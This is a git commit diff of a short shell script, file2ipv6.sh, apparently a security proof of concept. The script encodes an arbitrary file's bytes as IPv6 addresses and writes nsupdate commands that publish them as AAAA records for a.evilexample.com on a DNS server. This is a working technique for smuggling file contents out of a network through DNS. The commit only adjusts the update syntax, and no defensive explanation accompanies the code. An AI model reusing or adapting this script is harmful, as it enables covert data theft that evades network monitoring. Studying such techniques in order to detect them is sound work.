561d7a9f4b3de4eb0127e9ce71cd476ba6def35a
Johannes Ullrich <jullrich@euclidian.com>
2016-07-26 11:56:12 -0400

    minor update

--- file2ipv6.sh
+++ file2ipv6.sh
@@ -2,14 +2,12 @@
 n=2000
 echo server 10.128.0.5
 echo zone evilexample.com
-echo prereq yxrrset a.evilexample.com AAAA
 echo update delete a.evilexample.com AAAA
-echo send
 for b in `xxd -p -c 14 $1 | sed 's/..../&:/g' | sed 's/:$//' `; do
  f=$n:$b
  f=`echo $f | sed 's/:..$/&00/'`
  f=`echo $f:0000:0000:0000:0000:0000:0000:0000:0000 | head -c39`
- echo update a.evilexample.com. 10 AAAA $f
+ echo update add a.evilexample.com. 10 AAAA $f
  n=$((n+1));
 done
 echo send
